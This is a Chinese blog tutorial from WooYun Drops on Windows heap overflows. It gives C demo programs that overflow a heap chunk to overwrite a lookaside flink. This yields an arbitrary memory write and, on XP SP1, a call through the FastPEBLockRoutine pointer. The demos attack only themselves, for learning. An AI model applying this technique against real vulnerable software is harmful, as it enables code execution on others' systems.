@@ -1,0 +1,199 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">堆溢出学习笔记</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">lxj616</a> <span class="bull">·</span> <time title="2014/05/02 14:48" ui-time="" datetime="2014/05/02 14:48" class="published ng-binding ng-isolate-scope">2014/05/02 14:48</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 概述</h2><hr><p>本文从程序实例出发，展示了XP SP1下的堆溢出+代码执行，XP SP3下的堆溢出+内存任意写，主要面向{已经掌握缓冲区溢出原理，希望进一步了解堆溢出原理的初学者}、{就是想找个堆溢出例子跑一遍的安全爱好者}以及{跑不通各种堆溢出书籍示例代码、非得跑通代码才看的进去书的搜索者}</p><p>本笔记参考自：<a href="http://net-ninja.net/article/2011/Sep/03/heap-overflows-for-humans-102/">http://net-ninja.net/article/2011/Sep/03/heap-overflows-for-humans-102/</a></p><p>代码有较多改动，终于跑通了，并且试着简单地利用了一下。</p><p>按照代码阅读者视角 整理了讲解思路。</p><p>笔记只供初学者参考，并非严肃探讨堆溢出细节问题，若有不当之处恳请各位指正。</p><h2>0x01 测试代码环境</h2><hr><pre><code>虚拟机：  VirtualBox
+操作系统:  Windows XP  sp1
+编译器：   VC++ 6.0
+调试工具:  看雪OllyICE
+</code></pre><p>其中，Windows XP 只能是sp1，因为sp2之后需要绕过其溢出保护机制 会使文章更加复杂。</p><p>如果您想要寻找xp sp3 下的内存任意写实例，请跳转0x09。</p><h2>0x02 测试代码步骤</h2><hr><p>安装Windows XP sp1 注意，网上有很多sp2 不知什么目的写成是sp1，下面是真正的sp1 <a href="http://pan.baidu.com/share/link?shareid=371613660&amp;uk=1865555701&amp;fid=2361791550">http://pan.baidu.com/share/link?shareid=371613660&amp;uk=1865555701&amp;fid=2361791550</a></p><p>下载VC++ 6.0 绿色版 <a href="http://pan.baidu.com/s/1kTLqYnd">http://pan.baidu.com/s/1kTLqYnd</a> 解压后运行sin.bat</p><p>下载代码工程 <a href="http://pan.baidu.com/s/1kT5HRNp">http://pan.baidu.com/s/1kT5HRNp</a></p><p>或者拷贝文中代码 自己新建工程</p><pre><code>#!cpp
+/*
+        Overwriting a chunk on the lookaside example
+*/
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+void print()
+{
+    printf("\nHello\n");
+}
+
+int main(int argc,char *argv[])
+{
+        char *a,*b,*c;
+        long *hHeap;
+        char buf[10];
+
+        printf("----------------------------\n");
+        printf("Overwrite a chunk on the lookaside\n");
+        printf("Heap demonstration\n");
+        printf("----------------------------\n");
+
+        // create the heap
+        hHeap = HeapCreate(0x00040000,0,0);
+        printf("\n(+) Creating a heap at: 0x00%xh\n",hHeap);
+        printf("(+) Allocating chunk A\n");
+
+        // allocate the first chunk of size N (&lt;0x3F8 bytes)
+        a = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+        printf("(+) Allocating chunk B\n");
+
+        // allocate the second chunk of size N (&lt;0x3F8 bytes)
+        b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+
+        printf("(+) Chunk A=0x00%x\n(+) Chunk B=0x00%x\n",a,b);
+        printf("(+) Freeing chunk B to the lookaside\n");
+
+        // Freeing of chunk B: the chunk gets referenced to the lookaside list
+        HeapFree(hHeap,0,b);
+
+        // set software bp
+        //__asm__("int $0x3");
+
+        printf("(+) Now overflow chunk A:\n");
+
+        // The overflow occurs in chunk A: we can manipulate chunk B's Flink
+        // PEB lock routine for testing purposes
+        // 16 bytes for size, 8 bytes for header and 4 bytes for the flink
+
+        strcpy(a,"XXXXXXXXXXXXXXXXAAAABBBB\x20\xf0\xfd\x7f");
+        // strcpy(a,"XXXXXXXXXXXXXXXXAAAABBBBDDDD");
+
+        //gets(a);
+
+        // set software bp
+        //__asm__("int $0x3");
+
+        printf("(+) Allocating chunk B\n");
+
+        // A chunk of block size N is allocated (C). Our fake pointer is returned
+        // from the lookaside list.
+        b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+        printf("(+) Allocating chunk C\n");
+
+        // set software bp
+        //    __asm__("int $0x3");
+
+        // A second chunk of size N is allocated: our fake pointer is returned
+        c = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+
+        printf("(+) Chunk A=0x00%x\n(+)Chunk B=0x00%x\n(+) Chunk C=0x00%x\n",a,b,c);
+
+        // A copy operation from a controlled input to this buffer occurs: these
+        // bytes are written to our chosen location
+        // insert shellcode here
+
+        printf("%x",print);
+        memcpy(c,"\x00\x10\x40\x00",4);
+        // set software bp
+        //_asm int 0x3;
+
+        exit(0);
+ }
+</code></pre><p>编译运行，运气好的直接就能跑，不过一般会如下图：</p><p><img alt="enter image description here" img-src="f79da57ab2dcd265121cbc513f0033b30cbda296.jpg"></p><p>显示为：401005（0x00401005），然后修改代码中：</p><pre><code>#!cpp
+memcpy(c,"\x00\x10\x40\x00",4);
+</code></pre><p>改成</p><pre><code>#!cpp
+memcpy(c,"\x05\x10\x40\x00",4);     
+</code></pre><p>重新编译运行即可，成功后如下图：</p><p><img alt="enter image description here" img-src="39ebd6d72a69668ca0e9fe9f1f048ea08cfa2f42.jpg"></p><p>然后就可以开始正文了。</p><h2>0x03 溢出的位置</h2><hr><p>之前我们给a从堆里分配了0x10即16个字节的空间</p><pre><code>#!cpp
+a = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+</code></pre><p>因此</p><pre><code>#!cpp
+strcpy(a,"XXXXXXXXXXXXXXXXAAAABBBB\x20\xf0\xfd\x7f");
+</code></pre><p>发生了溢出。</p><h2>0x04 溢出前发生了什么</h2><hr><pre><code>#!cpp
+HeapFree(hHeap,0,b);
+</code></pre><p>把b free掉，然后b就会被放到lookaside list备用。</p><h2>0x05 溢出后覆盖了什么</h2><hr><p>覆盖了b的freelist chunk结构。</p><p>（AAAABBBB覆盖了Headers，然后\x20\xf0\xfd\x7f覆盖的是flink）</p><p><img alt="enter image description here" img-src="76bafe381ab86fd8851e40279eb97479ef717900.jpg"></p><h2>0x06 溢出后发生了什么</h2><hr><pre><code>#!cpp
+ printf("(+) Allocating chunk B\n");
+
+// A chunk of block size N is allocated (C). Our fake pointer is returned
+// from the lookaside list.
+ b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+ printf("(+) Allocating chunk C\n");
+
+// set software bp
+//    __asm__("int $0x3");
+
+// A second chunk of size N is allocated: our fake pointer is returned
+c = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+
+printf("(+) Chunk A=0x00%x\n(+)Chunk B=0x00%x\n(+) Chunk C=0x00%x\n",a,b,c);
+</code></pre><p>先是从lookaside取回b （flink已经被覆盖了），然后再去分配c ，于是c被分配到了b的flink即我们的虚假指针处，之后就可以实现内存任意写了（写进c的内容就是写进虚假指针）</p><h2>0x07 虚假指针指向什么地方</h2><hr><p>0x7FFDF000 指向 FastPEBLockRoutine() 地址指针 （XP SP1） 我们覆盖这个地址，这样一旦触发异常，就会去call 这个地址。</p><p>然后我们把print函数地址写进去，于是就会去执行print函数（显示Hello，Hello上面打印的是print函数的地址）</p><h2>0x08 为什么非要XP SP1才能运行以上代码</h2><hr><p>因为SP1里面FastPEBLockRoutine()的地址是固定的，而SP2以后版本会随机</p><h2>0x09 我就是要在XP SP3下跑代码，我不想下载SP1</h2><hr><p>那就用如下代码吧，不过就没法FastPEBLockRoutine()随意call 了</p><pre><code>#!cpp
+/*
+        Overwriting a chunk on the lookaside example
+*/
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+int main(int argc,char *argv[])
+{
+        char str[]="\nHello123456789213456789\n";
+
+
+        char *a,*b,*c;
+        long *hHeap;
+        char buf[10];
+
+        printf("----------------------------\n");
+        printf("Overwrite a chunk on the lookaside\n");
+        printf("Heap demonstration\n");
+        printf("----------------------------\n");
+
+        // create the heap
+        hHeap = HeapCreate(0x00040000,0,0);
+        printf("\n(+) Creating a heap at: 0x00%xh\n",hHeap);
+        printf("(+) Allocating chunk A\n");
+
+        // allocate the first chunk of size N (&lt;0x3F8 bytes)
+        a = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+        printf("(+) Allocating chunk B\n");
+
+        // allocate the second chunk of size N (&lt;0x3F8 bytes)
+        b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+
+        printf("(+) Chunk A=0x00%x\n(+) Chunk B=0x00%x\n",a,b);
+        printf("(+) Freeing chunk B to the lookaside\n");
+
+        // Freeing of chunk B: the chunk gets referenced to the lookaside list
+        HeapFree(hHeap,0,b);
+
+        // set software bp
+        //__asm__("int $0x3");
+
+        printf("(+) Now overflow chunk A:\n");
+
+        // The overflow occurs in chunk A: we can manipulate chunk B's Flink
+        // PEB lock routine for testing purposes
+        // 16 bytes for size, 8 bytes for header and 4 bytes for the flink
+
+        printf("%x\n",str);
+        printf(str);
+        memcpy(a,"XXXXXXXXXXXXXXXXAAAABBBB\x64\xff\x12\x00",28);
+        // strcpy(a,"XXXXXXXXXXXXXXXXAAAABBBBDDDD");0x71ac4050
+
+        //gets(a);
+
+        // set software bp
+        //__asm__("int $0x3");
+
+        printf("(+) Allocating chunk B\n");
+
+        // A chunk of block size N is allocated (C). Our fake pointer is returned
+        // from the lookaside list.
+        b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+        printf("(+) Allocating chunk C\n");
+
+        // set software bp
+        //    __asm__("int $0x3");
+
+        // A second chunk of size N is allocated: our fake pointer is returned
+        c = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+
+        printf("(+) Chunk A=0x00%x\n(+)Chunk B=0x00%x\n(+) Chunk C=0x00%x\n",a,b,c);
+
+        // A copy operation from a controlled input to this buffer occurs: these
+        // bytes are written to our chosen location
+        // insert shellcode here
+        strcpy(c,"AAAAAAAAAAAA\n");
+        printf(str);
+        // set software bp
+        //_asm int 0x3;
+
+        exit(0);
+ }
+</code></pre><p>也许一遍就能跑通，但是一般来说还是像下面一样</p><p><img alt="enter image description here" img-src="bb712e055c9dce83da2aa1f91194bd20f3b93755.jpg"></p><p>老规矩，自己改代码（图中12ff64）0x0012ff64</p><pre><code>#!cpp
+memcpy(a,"XXXXXXXXXXXXXXXXAAAABBBB\x64\xff\x12\x00",28);
+</code></pre><p>注意里面有\x00，所以我换用memcpy了，成功后如下图</p><p><img alt="enter image description here" img-src="4a681dc2745cd7abf963589961e2a14ea38157a5.jpg"></p><p>那么，这段代码展示的实际上是内存任意写（没有call anycode的利用），只是把任意内容写到了str里面，即free(b)，再用str地址覆盖b的flink，然后取回b，然后分配c，c被分配到了str地址，然后向c里面写AAAAAAA，然后就写进str里面了。</p><h2>0x0A 结语</h2><hr><p>个人观点：尽管看到这里读者仍然只是似懂非懂地{大致了解堆溢出的原理和过程}，但是起码有了一个基本的概念，对以后深入研究其机理 奠定了兴趣基础，并且对于{只是好奇的爱好者}来说，涉猎这些也就够了。</p><p>建议有兴趣的朋友们去看看heap-overflows-for-humans-102 原文，里面有很多基础概念的讲解，本笔记仅为学习时的记录，并非严肃翻译原文。</p><h2>0x0B reference</h2><hr><p><a href="http://net-ninja.net/article/2011/Sep/03/heap-overflows-for-humans-102/">http://net-ninja.net/article/2011/Sep/03/heap-overflows-for-humans-102/</a></p><p>注：本文代码基于此文章修改，改动较大。</p><p>《C和C++安全编码》</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/7326" rel="bookmark" id="re1">堆溢出的unlink利用方法</a></li><li><a href="http://drops.wooyun.org/papers/1714" rel="bookmark" id="re2">Windows平台下的堆溢出利用技术（二）（上篇）</a></li><li><a href="http://drops.wooyun.org/tips/6595" rel="bookmark" id="re3">深入理解 glibc malloc</a></li><li><a href="http://drops.wooyun.org/binary/7714" rel="bookmark" id="re4">格式化字符串漏洞简介</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">kkk</span> <span class="reply-time">2015-10-23 21:54:49</span></div><p></p><p>XP SP3 HeapAlloc得到的内存地址向前看好象并没有这个freelist chunk结构呢？。覆盖了不起作用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">od</span> <span class="reply-time">2014-08-21 19:03:56</span></div><p></p><p>thank Y very much^_^</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-08-17 14:03:53</span></div><p></p><p>http://pan.baidu.com/s/1hqqsEJq<br>2kae</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">od</span> <span class="reply-time">2014-08-17 10:18:28</span></div><p></p><p>上面的sp1取消了，能再提供一个吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gainover</span> <span class="reply-time">2014-05-03 10:35:04</span></div><p></p><p>我觉得 http://net-ninja.net/article/2011/Sep/03/heap-overflows-for-humans-102/ 这篇文章里开头讲堆结构以及相关API的部分要一并写过来就更好了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小胖子</span> <span class="reply-time">2014-05-02 17:48:13</span></div><p></p><p>牛逼！</p><p></p></div></div></div></div></div></main>
